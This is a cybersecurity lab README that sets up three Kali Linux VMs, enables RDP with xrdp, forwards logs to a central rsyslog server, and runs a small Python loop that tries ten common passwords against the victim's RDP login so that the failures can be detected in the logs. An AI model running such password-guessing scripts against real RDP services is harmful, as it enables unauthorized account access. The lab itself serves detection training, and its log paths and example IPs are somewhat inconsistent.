# 🔐 Linux-to-Linux RDP Brute Force Lab with Centralized Logging

This lab demonstrates a brute-force attack on an RDP-enabled Kali Linux machine from another Kali attacker machine. A third Kali machine acts as a **centralized log server** using `rsyslog`. The goal is to simulate failed login attempts, capture them via logs, and forward them to a centralized syslog server for monitoring.

> ⚠️ **Educational Use Only**  
> Do **not** use this on real or unauthorized systems.

---

## 🖥️ Lab Setup Overview

We will use **three Kali Linux VMs** connected via VirtualBox **NAT Network**:

| Machine Role        | Hostname      | IP Address Example |
|---------------------|---------------|---------------------|
| Attacker Machine    | `attacker` | `10.0.2.6`          |
| Victim Machine      | `kali-linux-2025`   | `10.0.2.5`          |
| Log Server Machine  | `kali-logger`   | `10.0.2.7`          |

---

## ⚙️ Step-by-Step Setup

### 1. 🧠 Create NAT Network in VirtualBox

- Open **VirtualBox** → `File` → `Tools` → `Network`.
- Create a **NAT Network** (e.g., `NatNetwork`).

### 2. 🛠 Assign NAT Network to All VMs

- For each VM, go to `Settings` → `Network` → Adapter 1.
- Set to **Attached to: NAT Network** and select `NatNetwork`.
  ![nat](https://github.com/user-attachments/assets/b37b819b-b5e0-40f2-b07f-c48faca03e72)


### 3. 📡 Check IP Addresses

Run this on each VM:

```bash
ip a
```
![Screenshot 2025-05-22 130803](https://github.com/user-attachments/assets/153a6a42-17ae-4b56-ae4a-55500699992f)


Note their IPs for future steps.

### 4. 📡 Enable RDP on Victim Machine
- Install and enable xrdp on the kali-linux-2025 machine:
```bash
sudo apt update
sudo apt install xrdp -y
sudo systemctl enable xrdp
sudo systemctl start xrdp
```
![2](https://github.com/user-attachments/assets/40fe63e3-f070-4d69-bb3e-fc3f8837df06)

- Check if RDP is listening:
```bash
sudo ss -tulpn | grep xrdp
```
![3](https://github.com/user-attachments/assets/a1139dd2-ace5-4080-b2b3-db20229db208)

### 5. 📡 Configure Centralized Logging (kali-logger)
On ```kali-logger``` (log server):

1. Install rsyslog
```bash
sudo apt update
sudo apt install rsyslog
```

3. Edit rsyslog config:
```bash
sudo nano /etc/rsyslog.conf
```
Uncomment or add these lines:
```conf
module(load="imudp")
input(type="imudp" port="514")
module(load="imtcp")
input(type="imtcp" port="514")
```
![4](https://github.com/user-attachments/assets/a056da09-bd34-4290-9467-34cf69edbff8)

3. Create a log directory for incoming logs:
```bash
sudo mkdir /var/log/remotelogs
sudo nano /etc/rsyslog.d/remote.conf
```
4. Restart ```rsyslog```
```bash
sudo systemctl restart rsyslog
```

---

### 📤 6: Configure Victim to Send Logs to Logger

1. Install rsyslog in the victim machine:
```bash
sudo apt update
sudo apt install rsyslog
```
Edit rsyslog config:
```bash
sudo nano /etc/rsyslog.conf
```
At the bottom, add:
```bash
*.* @@10.0.2.7:514
```
2. Restart rsyslog:
```bash
sudo systemctl restart rsyslog
```
3. Test log forwarding:
```bash
logger "Test message from kali-victim"
```
![5](https://github.com/user-attachments/assets/ac85fd88-4ddf-4722-ad10-43bba3c3a419)

Check on ```kali-logger```:
```bash
sudo tail -f /var/log/remotelogs/kali/syslog.log
```
![6](https://github.com/user-attachments/assets/cc15ec8f-d1f9-4b37-ae87-11ca7c182042)


---
### 🐍7: Brute Force Python Script (on kali-attacker)
Generally, ```freerdp3-x11``` is pre-installed in kali.
Now create the script:
```bash
nano rdp_brute.py
```
Paste this:
```bash
import os
import time

target_ip = input("Enter victim IP (e.g., 10.0.2.6): ")
username = input("Enter username: ")

passwords = [
    "123456", "password", "kali", "toor", "letmein",
    "qwerty", "admin", "root", "pass123", "test123"
]

for i, password in enumerate(passwords, 1):
    print(f"[{i}] Trying password: {password}")
    result = os.system(f"xfreerdp3 /v:{target_ip} /u:{username} /p:{password} +auth-only /cert:ignore")
    time.sleep(1)

```
Make it executable:
```bash
chmod +x rdp_brute.py
```
Run the attack:
```bash
python3 rdp_brute.py
```
![7](https://github.com/user-attachments/assets/70804431-5a68-4ece-9697-3b6ad91a52c0)


---

### 📋 8: Check Logs on Central Log Server
On ```kali-logger```, tail the logs:
```bash
sudo tail -f /var/log/remotelogs/kali-victim/syslog.log
```
### Look for failed RDP logon entries.
![8](https://github.com/user-attachments/assets/318d96b5-b1d0-42bc-97f0-e1b213ac7bcb)


## ✅ Summary
✅ Enabled RDP on Linux (xrdp)

✅ Configured rsyslog for centralized logging

✅ Ran brute-force Python script from attacker

✅ Verified log forwarding and detection

# ⚠️ Disclaimer
This lab is for ethical hacking and educational use only.
Never attack any system without explicit permission.


